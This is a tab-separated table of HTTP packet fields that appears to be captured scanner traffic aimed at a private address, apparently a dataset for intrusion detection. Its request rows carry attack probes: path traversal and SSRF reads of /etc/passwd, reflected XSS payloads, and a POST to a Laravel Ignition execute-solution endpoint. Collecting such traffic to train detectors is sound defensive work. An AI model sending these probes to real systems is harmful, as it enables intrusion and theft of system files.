http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/api/geojson?url=file:///etc/passwd		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML like Gecko) Chrome/44.0.2403.155 Safari/537.36				/web/api/geojson?url=file:///etc/passwd
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/wlsecurity.html		GET				HTTP/1.1																			Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.137 Safari/4E423F				/web/wlsecurity.html
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?option=com_shoutbox&controller=../../../../../../../etc/passwd%00		GET				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/index.php?option=com_shoutbox&controller=../../../../../../../etc/passwd%00
	gzip																close										192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/language/lang		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36			s_asptitle=HD-Network%20Real-time%20Monitoring%20System%20V2.0; s_Language=../../../../../../../../../../../../../../etc/passwd; s_browsertype=2; s_ip=; s_port=; s_channum=; s_loginhandle=; s_httpport=; s_sn=; s_type=; s_devtype=	/web/language/lang
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36				/web/printenv.shtml?%3Cscript%3Ealert(%27xss%27)%3C/script%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/pandora_console/attachment/pandora_chat.log.json.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/pandora_console/attachment/pandora_chat.log.json.txt
	gzip																close		77	77	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/cas/v1/tickets/		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/cas/v1/tickets/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/webmail/?language=%22%3E%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
application/json	gzip																close		307	307	application/json						192.168.1.104															1	http://192.168.1.104/web/_ignition/execute-solution		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/_ignition/execute-solution
